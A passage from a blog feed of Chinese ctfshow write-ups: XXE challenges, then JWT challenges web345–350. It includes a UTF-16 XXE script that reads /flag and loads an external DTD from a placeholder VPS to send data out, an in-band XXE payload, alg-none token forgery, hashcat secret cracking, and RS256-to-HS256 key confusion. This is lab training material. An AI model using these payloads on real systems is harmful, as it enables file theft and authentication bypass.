class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>过滤了http 但是可以用utf-16绕过。用python脚本：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">&#x27;http://0ec4fe9d-6949-4e9d-a3b1-70be3bb3f01b.challenge.ctf.show/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://[vps-ip]/xxe.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = payload.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">rep = requests.<span class="title function_ invoke__">post</span>(url=url, data=payload)</span><br><span class="line"><span class="keyword">print</span>(rep.text)</span><br></pre></td></tr></table></figure><h1 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h1>以xml格回显：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1700389058163-935cedcd-0ef8-4e71-b0aa-95e08ff35a23.png" alt="image.png"><br>payload：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY file SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;<span class="number">123</span>&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1700389263619-92a66fef-5b89-4efb-b8a8-f022df7aa4be.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web345-web350Jwt篇</title>
      <link href="/2023/12/08/web345-web350Jwt%E7%AF%87/"/>
      <url>/2023/12/08/web345-web350Jwt%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h1><blockquote><p><a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></p></blockquote><p>jwt格式如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header.<span class="property">payload</span>.<span class="property">signature</span></span><br></pre></td></tr></table></figure><ul><li><p>Header 通常由两部分组成:token类型和哈希算法,例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>Payload 负载,存放有效信息的地方,比如用户ID,用户名等。它也可以存放私有数据。</p></li><li><p>Signature 签名,是对前两部分数据签名,防止数据篡改。它由 header 和 payload 使用算法生成,例如 HMAC-SHA256。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">标准中注册的声明 (建议但不强制使用) </span><br><span class="line"># iss: jwt签发者</span><br><span class="line"># sub: jwt所面向的用户</span><br><span class="line"># aud: 接收jwt的一方</span><br><span class="line"># exp: jwt的过期时间，这个过期时间必须要大于签发时间</span><br><span class="line"># nbf: 定义在什么时间之前，该jwt都是不可用的</span><br><span class="line"># iat: jwt的签发时间</span><br><span class="line"># jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</span><br></pre></td></tr></table></figure><h1 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h1><p>源代码<code>/admin</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">要注意使用 url 访问网页时</span><br><span class="line">/admin表示访问 admin.php 文件</span><br><span class="line">/admin/表示访问 admin/目录下的文件，默认是 index.php</span><br><span class="line">很像文件夹，所以此处应该访问 /admin/</span><br></pre></td></tr></table></figure><p>cookie中auth：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2OTUyOTA0NTAsImV4cCI6MTY5NTI5NzY1MCwibmJmIjoxNjk1MjkwNDUwLCJzdWIiOiJ1c2VyIiwianRpIjoiODQ1YTFjN2Q1ODY5MGQ5MGJiZWJkZjAxNWYxZWFmOTQifV0</span><br></pre></td></tr></table></figure><p><a href="https://jwt.io/">https://jwt.io/</a> 直接在线解密：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695290625614-d99069b9-f084-40a0-88a0-148e61e78765.png" alt="image.png"><br>alg显示没有加密，那就直接将sub中改为admin，再base64加密即可。<br>前部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.WwogIHsKICAgICJpc3MiOiAiYWRtaW4iLAogICAgImlhdCI6IDE2OTUyOTExOTYsCiAgICAiZXhwIjogMTY5NTI5ODM5NiwKICAgICJuYmYiOiAxNjk1MjkxMTk2LAogICAgInN1YiI6ICJhZG1pbiIsCiAgICAianRpIjogIjk1Y2U2ZWE1ZmI1MTI0MzQxNzk5YTEwZmM5ZGM3ZTAyIgogIH0KXQ==</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoiYWRtaW4ifV0</span><br></pre></td></tr></table></figure><p>如果要有等号需要去掉等号。<br>这个上面怎么都传不进，看了视频发现，把jwt那个直接在hackbar里面base64decode一下，修改为admin，再base64加密，访问<code>/admin/</code>即可了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0AW3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2OTUyOTIxODksImV4cCI6MTY5NTI5OTM4OSwibmJmIjoxNjk1MjkyMTg5LCJzdWIiOiJhZG1pbiIsImp0aSI6ImNmOGI3YWRmYmU1YTQwZWM1MTVjM2RiZWYxN2Y3MGE3In1d</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695292368648-e7712144-6927-4fd3-a898-f023d9111a22.png" alt="image.png"></p><h1 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h1><p>解析发现算法为 HS256 ，但是可以通过将算法设定为None来绕过签名。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698825091212-4ec0d830-aaa1-4dcb-b978-99e446ccbdd3.png" alt="image.png"><br>从上到下依次为修改算法为None， sub改为admin，然后删除签名（signature）。<br>注意保留jwt最后面的.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">82</span>a441b0-<span class="number">3</span>aca-<span class="number">4</span>ca5-a55c-<span class="number">6</span>d56aa369491.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">118.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: auth=eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODgyNTA0NSwiZXhwIjoxNjk4ODMyMjQ1LCJuYmYiOjE2OTg4MjUwNDUsInN1YiI6ImFkbWluIiwianRpIjoiYjIwYmEzMzBiZDM4MDA1ZWFkNzVlOTQ5Y2U3ODJjZmEifQ.</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><p><code>ctfshow&#123;b94918f8-a660-4eef-91d3-04e17e3f78da&#125;</code></p><h1 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h1><p>这关无法使用绕过，但是它提示说密钥是一个弱口令。<br>编写一个纯数字字典，如果不行的话再用别的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;dict.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">1000000</span>):</span><br><span class="line">        f.<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">str</span>(i) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后使用hashcat爆破一下密钥：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a <span class="number">0</span> -m <span class="number">16500</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODgyNTI4MSwiZXhwIjoxNjk4ODMyNDgxLCJuYmYiOjE2OTg4MjUyODEsInN1YiI6InVzZXIiLCJqdGkiOiIzMTYzMTM4YTNkZDFkMjljNWFmMTRlZmU5MTRlYzBmOCJ9.OAWm4kUqDv4Yc6VHgs2UcYgEw-RspCJuZdtAOv5OFh4 ./dict.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698826414139-6daac597-9160-4cff-ae75-25505026087a.png" alt="image.png"><br>密码为123456，然后我们自定义一下：<br>但是bp这个不可以选择密码，还得用jwt.io来搞：（记得修改sub为admin）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODgyNjQ4NywiZXhwIjoxNjk4ODMzNjg3LCJuYmYiOjE2OTg4MjY0ODcsInN1YiI6ImFkbWluIiwianRpIjoiNzc0ZjIyNzgzYTJkMzJiYzgyYjhlZDk4YzVkY2FlNDAifQ.aBkzVchQIdrXUdH6HLcEc5Jm-Nq2ve63x7LnsauRkJc</span><br></pre></td></tr></table></figure><p><code>ctfshow&#123;a3bd8f39-f138-4ec8-a59a-bad1bfeb2591&#125;</code></p><h1 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h1><p>爆破，估计有字符了，那就重新再写一个字典。<br>示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># key = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;dict_alphabet.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    passwords = itertools.<span class="title function_ invoke__">product</span>(key, repeat=<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span> i in passwords:</span><br><span class="line">        f.<span class="title function_ invoke__">write</span>(<span class="string">&quot;&quot;</span>.<span class="title function_ invoke__">join</span>(i))</span><br><span class="line">        f.<span class="title function_ invoke__">write</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;generate success&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a <span class="number">0</span> -m <span class="number">16500</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODg0MTE5MCwiZXhwIjoxNjk4ODQ4MzkwLCJuYmYiOjE2OTg4NDExOTAsInN1YiI6InVzZXIiLCJqdGkiOiJkNTY2Y2I1ZWExNWI0ODRmNzc5ZTBjMDE1ZjEzNTlkMCJ9.<span class="number">5</span>BTUbhRJdFTlDaVlm3Sco8YhpWnkZVAkl30ISvvXjAg dict_alphabet.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698841816867-3968d4dd-ecca-461f-a6ba-2f99e5be9312.png" alt="image.png"><br>密码为aaab 用相同操作进行修改内容即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698841934066-3ab25f1a-7054-4e2c-8176-258da2441517.png" alt="image.png"><br><code>ctfshow&#123;6e11c2c1-073f-48d8-8779-e0fae7897081&#125;</code></p><h1 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h1><p>有个js页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/&#x27;</span>, function(req, res, next) &#123;</span><br><span class="line">  res.<span class="title function_ invoke__">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_ invoke__">readFileSync</span>(process.<span class="title function_ invoke__">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_ invoke__">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_ invoke__">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/&#x27;</span>,function(req,res,next)&#123;</span><br><span class="line"><span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">res.<span class="title function_ invoke__">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> auth = req.cookies.auth;</span><br><span class="line"><span class="keyword">var</span> cert = fs.<span class="title function_ invoke__">readFileSync</span>(process.<span class="title function_ invoke__">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">jwt.<span class="title function_ invoke__">verify</span>(auth, cert, function(err, decoded) &#123;</span><br><span class="line">  <span class="keyword">if</span>(decoded.user===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  res.<span class="title function_ invoke__">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_ invoke__">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>信息泄露。<br>注意这个public是不出现在路由也就是<code>xxxx.com/private.key</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNioS2aSHtu6WIU88oWzpShhkb</span><br><span class="line">+r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnX</span><br><span class="line">YqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjA</span><br><span class="line">bG1Naz58ibbtogeglQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDb</span><br><span class="line">eni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8</span><br><span class="line">IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB</span><br><span class="line">AoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PK</span><br><span class="line">frOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX</span><br><span class="line">h7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM</span><br><span class="line">cdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi</span><br><span class="line">ST9LU4lxAkEA1lsfr9gF/<span class="number">9</span>OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv</span><br><span class="line">ubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA</span><br><span class="line">+tUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ</span><br><span class="line">V7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIW</span><br><span class="line">zawYVGZdwvuD9IgY/QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV</span><br><span class="line">x+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><h2 id="如何做nodejs"><a href="#如何做nodejs" class="headerlink" title="如何做nodejs"></a>如何做nodejs</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1vU4y187HE?p=5&vd_source=9c03c9cbee12e68c0989088a5b2ff127">https://www.bilibili.com/video/BV1vU4y187HE?p=5&amp;vd_source=9c03c9cbee12e68c0989088a5b2ff127</a></p></blockquote></li></ul><p>目标目录下运行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx express-generator</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698843163505-fec5ff33-fee1-4727-a843-5a426cdbfe89.png" alt="image.png"><br>替换routes/index.js下的内容<br>将公钥和私钥放入对应位置.<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698843325306-6147461c-a9ea-4806-87c2-0fa07b7eb0e7.png" alt="image.png"><br>之前没下过包的需要npm install 一下对应包，比如那些require的内容。<br>其中fs和jwt需要申明一下变量。jwt（是jsonwebtoken）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698843930640-42dacf03-16bb-4e76-aa93-400a375a1c82.png" alt="image.png"><br>这个最后我还是报错，用cyberchef搞得：</p><blockquote><p><a href="https://cyberchef.org/#recipe=JWT_Sign('-----BEGIN%20RSA%20PRIVATE%20KEY-----%5CnMIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb%2Br6QPBryJmdaR1a3ToD9sXDb%5Cneni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8%5CnIEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB%5CnAoGAE%2BmAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2%2BOhYVEJq8VtPcVB1PK%5CnfrOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX%5Cnh7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM%5CncdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi%5CnST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl%2Bl9zpo1jjzhXlwmHFgyCAn7gBKeWdv%5CnubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA%5Cn%2BtUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0%2BzdsaOqsZs60QJAYqtJ%5CnV7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4%2BQgY%2BfYBt8DVFq5bHQUIvIW%5CnzawYVGZdwvuD9IgY/QJAGCJbXA%2BKnw10B%2Bg5tDZfVHsr6YYMY3Q24zVu4JXozWDV%5Cnx%2BG39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA%3D%3D%5Cn-----END%20RSA%20PRIVATE%20KEY-----','RS256')&input=ew0KICAidXNlciI6ICJhZG1pbiIsDQogICJpYXQiOiAxNjk4ODQxOTY1DQp9">cyberchef</a></p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698845146867-b28fcdc9-6919-4928-b309-59719152d0b0.png" alt="image.png"><br><code>ctfshow&#123;f7a45bf3-52c9-4bb7-87bc-ff0c2213a439&#125;</code></p><h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><p>这个题也考JWT的三种常见的攻击方式之一把非对称算法 RS256 改为对称算法 HS256，用泄露的公钥签名数据，服务器尝试用公钥作为 secret 验证签名。也就是CVE-2016-5431漏洞<br><em>给定token和key检查是否valid，同时如果有callback将会调用</em><br><em>所以合法的token，在于签名是否合法，而并不取决于之前的签名采用什么样的算法，因为使用何种算法的信息也存在于给定的jwt中</em><br><em>所以只要将公钥修改为对称，然后伪造session</em><br>这里想要绕过就只能使用nodejs搭建来做了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/&#x27;</span>, function(req, res, next) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">jwt</span> = <span class="keyword">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">fs</span> = <span class="keyword">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> privateKey = fs.<span class="title function_ invoke__">readFileSync</span>(process.<span class="title function_ invoke__">cwd</span>()+<span class="string">&#x27;\\public.key&#x27;</span>);</span><br><span class="line"><span class="comment">// console.log(privateKey);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> token = jwt.<span class="title function_ invoke__">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(token)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>注意将公钥文件放在根目录下。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web334-web344NodeJS篇</title>
      <link href="/2023/12/08/web334-web344NodeJS%E7%AF%87/"/>
      <url>/2023/12/08/web334-web344NodeJS%E7%AF%87/</url>
      
